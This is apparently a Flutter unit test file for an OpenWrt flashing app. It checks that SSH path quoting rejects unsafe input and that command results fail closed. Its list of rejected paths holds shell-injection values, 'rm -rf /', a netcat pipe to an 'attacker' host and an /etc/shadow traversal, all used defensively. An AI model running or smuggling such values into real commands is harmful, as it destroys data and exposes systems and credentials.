import 'package:flutter_test/flutter_test.dart';

import 'package:openwrt_flasher/services/ssh_service.dart';

void main() {
  group('remote path quoting', () {
    test('accepts an ordinary absolute path', () {
      expect(
        SSHService.quotePath('/tmp/openwrt-flasher-sysupgrade.bin'),
        "'/tmp/openwrt-flasher-sysupgrade.bin'",
      );
    });

    test('rejects anything that could break out of the quoting', () {
      const dangerous = [
        "/tmp/x'; reboot; '",
        r'/tmp/x$(reboot)',
        r'/tmp/x`reboot`',
        '/tmp/x; rm -rf /',
        '/tmp/x | nc attacker 4444',
        '/tmp/x&&sysupgrade',
        '/tmp/x rebooot',
        '/tmp/"x"',
        '/tmp/x\nreboot',
        '',
        '/../etc/shadow',
      ];
      for (final path in dangerous) {
        expect(
          () => SSHService.quotePath(path),
          throwsA(isA<SSHOperationException>()),
          reason: '"$path" must not reach the shell',
        );
      }
    });
  });

  group('fail-closed command results', () {
    test('a command that never ran is never treated as success', () {
      final never = RemoteCommand.notRun('ssh dropped');
      expect(never.executed, isFalse);
      expect(never.succeeded, isFalse);
      expect(
        () => SSHService.require(never, 'The compatibility test'),
        throwsA(isA<SSHOperationException>()),
      );
    });

    test('a missing exit status is a failure, not a pass', () {
      final unknown = RemoteCommand.completed(
        exitCode: null,
        stdout: '',
        stderr: '',
      );
      expect(unknown.succeeded, isFalse);
      expect(
        () => SSHService.require(unknown, 'Free space check'),
        throwsA(isA<SSHOperationException>()),
      );
    });

    test('a non-zero exit status is a failure', () {
      final failed = RemoteCommand.completed(
        exitCode: 1,
        stdout: '',
        stderr: 'Image check failed.',
      );
      expect(
        () => SSHService.require(failed, 'sysupgrade test'),
        throwsA(
          isA<SSHOperationException>().having(
            (e) => e.message,
            'message',
            contains('Image check failed.'),
          ),
        ),
      );
    });

    test('exit 0 passes', () {
      final ok = RemoteCommand.completed(
        exitCode: 0,
        stdout: 'glinet,gl-mt3000',
        stderr: '',
      );
      expect(SSHService.require(ok, 'Reading board name').output,
          'glinet,gl-mt3000');
    });
  });
}
